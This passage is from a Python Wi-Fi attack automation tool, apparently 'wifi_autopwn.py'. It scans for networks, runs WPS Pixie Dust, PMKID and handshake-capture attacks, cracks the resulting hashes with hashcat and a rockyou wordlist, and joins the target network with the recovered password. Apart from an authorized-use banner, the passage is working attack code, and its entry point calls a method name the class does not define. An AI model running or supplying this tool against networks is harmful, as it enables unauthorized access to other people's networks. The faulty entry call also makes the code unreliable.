                self.log("No wordlist found. Download rockyou.txt", "ERROR")
                print("  wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt")
                return False

        # Handle .gz wordlists
        if wordlist.endswith('.gz'):
            self.log("Extracting compressed wordlist...", "INFO")
            extracted = wordlist.replace('.gz', '')
            if not os.path.exists(extracted):
                self.run_command(['gunzip', '-k', wordlist])
            wordlist = extracted

        if not os.path.exists(wordlist):
            self.log(f"Wordlist not found: {wordlist}", "ERROR")
            return False

        self.log(f"Using wordlist: {wordlist}", "INFO")

        # Determine hash mode
        hash_mode = '22000'  # WPA-PBKDF2-PMKID+EAPOL (newer format)

        # Check file content to determine format
        try:
            with open(hash_file, 'r') as f:
                first_line = f.readline()
                if first_line.startswith('WPA'):
                    hash_mode = '22000'
        except:
            pass

        # Build hashcat command
        potfile = self.capture_dir / "hashcat.pot"

        cmd = [
            'hashcat',
            '-m', hash_mode,
            '-a', '0',  # Dictionary attack
            '--potfile-path', str(potfile),
            '-w', '3',  # Workload profile
            '--force',  # Force run even on CPU
            hash_file,
            wordlist
        ]

        if not self.verbose:
            cmd.extend(['--quiet'])

        self.verbose_log(f"Hashcat command: {' '.join(cmd)}")

        print(f"\n{Colors.HEADER}{'='*60}")
        print("Starting Hashcat")
        print(f"{'='*60}{Colors.ENDC}\n")
        print(f"Hash file: {hash_file}")
        print(f"Wordlist: {wordlist}")
        print(f"Hash mode: {hash_mode}\n")

        try:
            subprocess.run(cmd)

            # Check if password was found in potfile
            if os.path.exists(potfile):
                with open(potfile, 'r') as f:
                    for line in f:
                        # Format: hash:password
                        if ':' in line:
                            password = line.split(':', 1)[1].strip()
                            self.log("PASSWORD CRACKED!", "SUCCESS")
                            print(f"\n{Colors.OKGREEN}{Colors.BOLD}{'='*60}")
                            print(f"Network: {target['essid']}")
                            print(f"Password: {password}")
                            print(f"{'='*60}{Colors.ENDC}\n")
                            return password

            # Also check hashcat stdout for found password
            self.log("Password not found in wordlist", "WARNING")
            print(f"\n{Colors.WARNING}Suggestions:")
            print("  1. Try a larger wordlist")
            print("  2. Use hashcat rules for password mutations")
            print("  3. Try mask attack for common patterns")
            print(f"  4. Manual: hashcat -m {hash_mode} {hash_file} [wordlist]{Colors.ENDC}\n")

        except KeyboardInterrupt:
            print(f"\n{Colors.WARNING}Hashcat interrupted{Colors.ENDC}\n")
        except Exception as e:
            self.log(f"Hashcat error: {e}", "ERROR")

        return None

    def connect_to_network(self, target, password):
        """Connect to the network using discovered password"""
        self.log("Attempting to connect to network...", "INFO")

        essid = target['essid']

        # First, disable monitor mode
        self.disable_monitor_mode()

        # Wait for interface to be ready
        time.sleep(3)

        # Use nmcli to connect
        cmd = [
            'nmcli',
            'dev',
            'wifi',
            'connect',
            essid,
            'password',
            password
        ]

        self.verbose_log(f"Connecting with nmcli...")

        result = self.run_command(cmd, capture_output=True)

        if result and result.returncode == 0:
            self.log(f"Successfully connected to {essid}!", "SUCCESS")
            print(f"\n{Colors.OKGREEN}You are now connected to the network!{Colors.ENDC}")

            # Show connection info
            time.sleep(2)
            self.run_command(['nmcli', 'dev', 'show', self.original_interface], capture_output=False)
            return True
        else:
            self.log("Failed to connect to network", "ERROR")
            if result:
                print(result.stderr)
            return False

    def cleanup(self):
        """Cleanup and restore system state"""
        if self.current_process:
            self.verbose_log("Terminating active processes...")
            try:
                self.current_process.terminate()
                self.current_process.wait(timeout=5)
            except:
                pass

        self.disable_monitor_mode()

    def interactive_menu(self):
        """Main interactive menu"""
        print(f"{Colors.HEADER}{Colors.BOLD}")
        print("=" * 70)
        print("WiFi Attack Automation Suite - Complete Edition".center(70))
        print("=" * 70)
        print(f"{Colors.ENDC}")
        print(f"{Colors.WARNING}{Colors.BOLD}AUTHORIZED USE ONLY{Colors.ENDC}")
        print("For penetration testing, security research, and educational purposes.\n")

        # Check requirements
        if not self.check_root():
            return

        if not self.check_dependencies():
            return

        # Select interface
        if not self.select_interface():
            return

        # MAC address configuration
        if not self.change_mac_address():
            return

        # Enable monitor mode
        if not self.enable_monitor_mode():
            return

        try:
            while True:
                # Scan for networks
                if not self.scan_networks(duration=30):
                    break

                # Select target
                target = self.select_target()

                if target is None:
                    break
                elif target == 'rescan':
                    continue

                # Select attack vector
                attack = self.select_attack_vector(target)

                if not attack:
                    continue

                password = None
                hash_file = None

                # Execute attack
                if attack == 'auto':
                    # Try attacks in order of speed
                    self.log("Starting automated attack sequence...", "INFO")

                    # 1. Try WPS Pixie Dust first (fastest)
                    if target.get('wps') and not target.get('wps_locked'):
                        self.log("Trying WPS Pixie Dust...", "INFO")
                        result = self.attack_wps_pixie(target)
                        if result and result.get('password'):
                            password = result['password']

                    # 2. Try PMKID (no clients needed)
                    if not password:
                        self.log("Trying PMKID attack...", "INFO")
                        hash_file = self.attack_pmkid(target)

                    # 3. Try handshake capture
                    if not password and not hash_file:
                        self.log("Trying handshake capture...", "INFO")
                        cap_file = self.attack_handshake(target)
                        if cap_file:
                            hash_file = self.convert_to_hashcat(cap_file)

                elif attack == 'pixie':
                    result = self.attack_wps_pixie(target)
                    if result and result.get('password'):
                        password = result['password']

                elif attack == 'wps_pin':
                    result = self.attack_wps_pin(target)
                    if result and result.get('password'):
                        password = result['password']

                elif attack == 'pmkid':
                    hash_file = self.attack_pmkid(target)

                elif attack == 'handshake':
                    cap_file = self.attack_handshake(target)
                    if cap_file:
                        hash_file = self.convert_to_hashcat(cap_file)

                # Crack if we have a hash
                if hash_file and not password:
                    password = self.crack_with_hashcat(hash_file, target)

                # Connect if we have password
                if password:
                    connect = input(f"\n{Colors.OKBLUE}Connect to network? (y/n): {Colors.ENDC}")
                    if connect.lower() == 'y':
                        self.connect_to_network(target, password)
                        break  # Exit after successful connection

                # Continue?
                another = input(f"\n{Colors.OKBLUE}Attack another network? (y/n): {Colors.ENDC}")
                if another.lower() != 'y':
                    break

        except Exception as e:
            self.log(f"Error in interactive menu: {e}", "ERROR")
            if self.verbose:
                import traceback
                traceback.print_exc()
        finally:
            self.cleanup()


def main():
    parser = argparse.ArgumentParser(
        description='WiFi Attack Automation Suite - Complete Edition - AUTHORIZED USE ONLY',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Interactive mode (recommended):
    sudo python3 wifi_autopwn.py -i -v

  Quick automated attack:
    sudo python3 wifi_autopwn.py -i

Attack Vectors:
  - WPS Pixie Dust (fastest, if WPS enabled)
  - PMKID (no clients needed)
  - WPA Handshake (traditional method)
  - WPS PIN Bruteforce (very slow)

Requirements:
  - aircrack-ng suite (airodump-ng, aireplay-ng, airmon-ng)
  - hashcat
  - hcxtools (hcxdumptool, hcxpcapngtool)
  - reaver (for WPS attacks)
  - network-manager (nmcli)

Install:
  sudo apt update
  sudo apt install aircrack-ng hashcat hcxtools reaver network-manager

Educational Use Only:
  Only use on networks you own or have explicit written permission to test.
        """
    )

    parser.add_argument('-i', '--interactive', action='store_true',
                        help='Interactive mode with menus (recommended)')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Verbose output (show all commands and output)')

    args = parser.parse_args()

    suite = WiFiAttackSuite(verbose=args.verbose)

    # Always run interactive mode
    suite.interactive_mode()


if __name__ == '__main__':
    main()
